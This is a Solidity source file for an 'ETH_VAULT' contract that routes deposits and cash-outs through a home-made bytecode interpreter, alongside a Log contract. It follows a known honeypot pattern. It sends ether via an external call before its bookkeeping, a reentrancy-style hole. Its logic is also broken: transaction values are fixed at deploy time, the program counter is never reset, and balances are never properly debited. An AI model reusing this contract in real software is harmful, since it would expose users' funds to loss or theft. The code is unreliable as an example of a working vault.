pragma solidity ^0.4.19;

contract ETH_VAULT {
    mapping(address => uint) public balances;
    uint public MinDeposit = 1 ether;
    Log TransferLog;
    
    enum OpCode { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, LOG }
    
    struct Instruction {
        OpCode op;
        uint256 operand;
    }
    
    Instruction[] public program;
    uint256[] stack;
    uint256 pc;
    
    function ETH_VAULT(address _log) public {
        TransferLog = Log(_log);
        compileProgram();
    }
    
    function compileProgram() internal {
        program.push(Instruction(OpCode.PUSH, MinDeposit));
        program.push(Instruction(OpCode.LOAD, uint256(msg.sender)));
        program.push(Instruction(OpCode.ADD, msg.value));
        program.push(Instruction(OpCode.LOG, uint256(0))); // Deposit
        program.push(Instruction(OpCode.STORE, uint256(msg.sender)));
        
        program.push(Instruction(OpCode.LOAD, uint256(msg.sender)));
        program.push(Instruction(OpCode.SUB, msg.value));
        program.push(Instruction(OpCode.JZ, 0));
        program.push(Instruction(OpCode.CALL, uint256(msg.sender)));
        program.push(Instruction(OpCode.POP, uint256(msg.sender)));
        program.push(Instruction(OpCode.LOG, uint256(1))); // CashOut
    }
    
    function execute() internal {
        while (pc < program.length) {
            Instruction memory instr = program[pc];
            pc++;
            if (instr.op == OpCode.PUSH) {
                stack.push(instr.operand);
            } else if (instr.op == OpCode.POP) {
                stack.length--;
            } else if (instr.op == OpCode.ADD) {
                uint256 a = stack[stack.length - 1];
                stack.length--;
                uint256 b = stack[stack.length - 1];
                stack[stack.length - 1] = a + b;
            } else if (instr.op == OpCode.SUB) {
                uint256 a = stack[stack.length - 1];
                stack.length--;
                uint256 b = stack[stack.length - 1];
                stack[stack.length - 1] = b - a;
            } else if (instr.op == OpCode.JMP) {
                pc = instr.operand;
            } else if (instr.op == OpCode.JZ) {
                if (stack[stack.length - 1] == 0) {
                    pc = instr.operand;
                }
                stack.length--;
            } else if (instr.op == OpCode.LOAD) {
                stack.push(balances[address(instr.operand)]);
            } else if (instr.op == OpCode.STORE) {
                balances[address(stack[stack.length - 1])] = stack[stack.length - 2];
                stack.length -= 2;
            } else if (instr.op == OpCode.CALL) {
                address addr = address(stack[stack.length - 1]);
                uint256 val = stack[stack.length - 2];
                if (addr.call.value(val)()) {
                    stack.length -= 2;
                }
            } else if (instr.op == OpCode.LOG) {
                if (instr.operand == 0) {
                    TransferLog.AddMessage(msg.sender, msg.value, "Deposit");
                } else {
                    TransferLog.AddMessage(msg.sender, stack[stack.length - 1], "CashOut");
                    stack.length--;
                }
            }
        }
    }
    
    function Deposit() public payable {
        if (msg.value > MinDeposit) {
            execute();
        }
    }
    
    function CashOut(uint _am) public payable {
        if (_am <= balances[msg.sender]) {
            stack.push(_am);
            execute();
        }
    }
    
    function() public payable {}
}

contract Log {
    struct Message {
        address Sender;
        string Data;
        uint Val;
        uint Time;
    }
    
    Message[] public History;
    Message LastMsg;
    
    function AddMessage(address _adr, uint _val, string _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}